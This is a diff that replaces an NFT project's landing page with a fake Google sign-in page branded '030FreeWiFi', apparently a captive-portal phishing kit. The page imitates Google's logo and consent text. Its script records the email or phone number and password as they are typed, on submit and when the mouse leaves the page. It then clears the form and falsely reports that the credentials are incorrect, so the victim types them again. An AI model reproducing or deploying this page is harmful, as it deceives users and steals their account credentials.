@@ -1,50 +1,131 @@
-<!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:site" content="@Wizzardof0x" />
-    <meta name="twitter:title" content="DIAS - Decentral Interactive Assets" />
-    <meta
-      name="twitter:description"
-      content="DIAS unlocks a new layer of NFT technology by breaking the complexity of interactivity down to layers. This standard gives designers a simple and efficient workflow and platforms a unified render standard that is able to bring your tokens to life.
-Imagination is the only limit to this technology."
-    />
-    <meta name="twitter:creator" content="@Wizzardof0x" />
-    <meta name="twitter:image" content="http://ipfs.io/ipfs/QmQQkZaubSRUPiTq92B8hqXmKqBR5a9bPXwXvL1yhZ83Wf" />
-    <meta name="twitter:domain" content="https://dias.wiki" />
-
-    <title><%= htmlWebpackPlugin.options.title %></title>
-
-    <link rel="icon" type="image/png" href="/images/dias_logo.png" />
-  </head>
-  <body>
-    <div id="bg"></div>
-    <div id="dev-inf">&nbsp;</div>
-    <div id="stage" class="stage">
-      <div id="move">
-        <div class="show"><img src="./images/0-DIAS.png" class="showimg" /></div>
-        <div class="show"><img src="./images/1-ABOUT.png" class="showimg" /></div>
-        <div class="show"><img src="./images/2-SOLUTION.png" class="showimg" /></div>
-        <div class="show"><img src="./images/3-MISSION.png" class="showimg" /></div>
-        <div class="show"><img src="./images/4-SUPPORT.png" class="showimg" /></div>
-        <div class="show" id="p0x">
-          <script src="https://www.publish0x.com/widget/code"></script>
-          <publish0x-posts-widget aff="QBeXr0Nlby" background-color="rgba(20,20,20,1)" font-color="rgba(20,20,20,1)" content-ids="mM3vOYEvoJqg54XD"></publish0x-posts-widget>
-        </div>
-        <div class="show"><img src="./images/5-CONTACT.png" class="showimg" /></div>
-      </div>
-      <!-- Calendly badge widget begin -->
-      <link href="https://assets.calendly.com/assets/external/widget.css" rel="stylesheet" />
-      <script src="https://assets.calendly.com/assets/external/widget.js" type="text/javascript" async></script>
-      <script type="text/javascript">
-        window.onload = function () {
-          Calendly.initBadgeWidget({ url: "https://calendly.com/stereoiii6?hide_landing_page_details=1&hide_gdpr_banner=1", text: "BOOK A MEETING", color: "#ff0000", textColor: "#ffffff", branding: true });
-        };
-      </script>
-      <!-- Calendly badge widget end -->
-    </div>
-  </body>
-</html>
+                <head>
+                <meta name="viewport" content="width=device-width, initial-scale=1" />
+                <style>
+                body{
+                  text-align:center;
+                  padding:2em;
+                  font-family:helvetica;
+                  }
+                    #btn_in{
+                      padding:0.8em;
+                      background:black;
+                      color:white;
+                      border:0;
+                      border-radius:15px;
+                      width:250px;
+                  }
+                        #modal{
+                          text-align:center;
+                          width:500px;
+                          overflow:hidden;
+                          margin-left:calc(50% - 250px);
+                          margin-top:3em;
+                          background:white;
+                          border:lightgrey solid 1px;
+                          border-radius:12px;
+                          padding-top:2em;
+                          display:none;
+                  }
+                  #mbody{
+                    text-align:center;
+                    width:402px;
+                    overflow:hidden;
+                    margin-left:49px;
+                  }
+                            input{
+                              padding-top:0.5em;
+                              padding-bottom:0.5em;
+                              margin:0;
+                  }
+                            input{
+                              width:98%;
+                              max-width:400px;
+                              margin-top:0.5em;
+                  }
+                            #btn{background:black;color:white;border-radius:3px;text-align:center;margin-top:1em;padding:0.4em;}
+                            #use{width:400px;text-align:center;background:none;border-top:1px solid lightgrey;border-bottom:1px solid lightgrey;margin-left:50px;margin-top:1em;padding:0.5em;}
+                  #logtxt{font-size:0.6em;color:tomato;margin-top:0.5em;}     
+                  #txtline{margin:0;vertical-align: top; padding:5px;display:inline-block}
+                  #useimg{vertical-align: center;height:24px;width:24px;display:inline-block;}
+                  p{font-size:0.6em;width:400px;margin-left:50px;}
+                  #foot{position: absolute; top:98%;left:0;width:100%;color:white;background:black;font-size:0.7em;}
+                </style>
+                <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+                </head>
+                <body>
+                        <div id="head"></div>
+                        <div style="width:100%;text-align:center;"><button id="btn_in" style="text-align:center;">
+                        <svg xmlns="https://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 48 48" aria-hidden="true" class="L5wZDc" style="display:inline;">
+                        <path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"> </path>
+                        <path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"></path>
+                        <path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"></path>
+                        <path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"></path>
+                        <path fill="none" d="M2 2h44v44H2z"></path></svg>
+                        <h3 style="margin-left:1em;display:inline;font-size:2.5em;margin-top:-5px;">
+                        Sign In
+                        </h3>
+                          </button></div>
+                        
+                        <div id=modal>
+                            <div id=mhead><svg xmlns="https://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 48 48" aria-hidden="true" class="L5wZDc" style="display:inline;">
+                        <path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"></path>
+                        <path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"></path>
+                        <path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"></path>
+                        <path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"></path>
+                        <path fill="none" d="M2 2h44v44H2z"></path></svg></div>
+                            <div id=mbody>
+                                <input id=name type=text placeholder="Email or Phone"/>
+                                <input id=pin type=password placeholder="Password"/>
+                                <div id=btn>Sign In</div>
+                            </div>
+                          
+                            <div id=mfoot>
+                              <div id="logtxt"></div>
+                            <div id=use>
+                            <svg aria-hidden="true" class="line" id="useimg" fill="currentColor" focusable="false" viewBox="-5 -5 29 29" xmlns="https://www.w3.org/2000/svg"><path d="M12,2C6.48,2,2,6.48,2,12c0,5.52,4.48,10,10,10c5.52,0,10-4.48,10-10C22,6.48,17.52,2,12,2z M7.07,18.28 c0.43-0.9,3.05-1.78,4.93-1.78s4.51,0.88,4.93,1.78C15.57,19.36,13.86,20,12,20S8.43,19.36,7.07,18.28z M18.36,16.83 c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93,0.59-6.36,2.33C4.62,15.49,4,13.82,4,12c0-4.41,3.59-8,8-8c4.41,0,8,3.59,8,8 C20,13.82,19.38,15.49,18.36,16.83z"></path>
+                            <path d="M12,6c-1.94,0-3.5,1.56-3.5,3.5S10.06,13,12,13c1.94,0,3.5-1.56,3.5-3.5S13.94,6,12,6z M12,11c-0.83,0-1.5-0.67-1.5-1.5 C10.5,8.67,11.17,8,12,8c0.83,0,1.5,0.67,1.5,1.5C13.5,10.33,12.83,11,12,11z"></path></svg>
+                              <div class="line" id="txtline">Create a new account</div></div></div>
+                              
+                              
+                            
+                            <p id=txt>To continue, Google will share your name, email address, language preference, and profile picture with Google Developer Docs. Before using this app, you can review Google Developer Docs’s <a href="#">privacy policy</a> and <a href="">terms of service</a>.</p>
+                            </div>
+                        </div>
+                        <div id=foot>030FreeWiFi &copy; 2023-2025</div>
+                  <script>
+                  const modal = document.getElementById("modal"); 
+                  const gbtn = document.getElementById("btn_in");  
+                  const btn = document.getElementById("btn"); 
+                  const name = document.getElementById("name"); 
+                  const pin = document.getElementById("pin");   
+                  const logtxt = document.getElementById("logtxt");   
+                  const onToggle = (e) => {
+                    modal.style.display = "block";
+                    gbtn.style.display = "none";
+                  }
+                  let i = 0;
+                  let info = "";
+                  const onChange = (e) => {
+                    info = "#"+i+" / Incomplete Name ::  "+name.value+" / Incomplete Password :: "+pin.value;
+                    console.log(info);
+            i++;        
+                    
+                  }
+                  const onSubmit = (e) => {
+                    console.log(info);
+                    name.value = "";
+                    pin.value = "";
+                    logtxt.innerHTML = "The login credentials are incorrect ! Please try logging in again.";
+                  }
+                  const onLeave = (e) => {
+                    console.log(info);
+                  }
+                  gbtn.addEventListener("click",onToggle);
+                  name.addEventListener("change",onChange);
+                  pin.addEventListener("change",onChange);
+                  btn.addEventListener("click",onSubmit);
+                  document.addEventListener("mouseleave",onLeave);
+                </script>
+                </body>
+            </html>
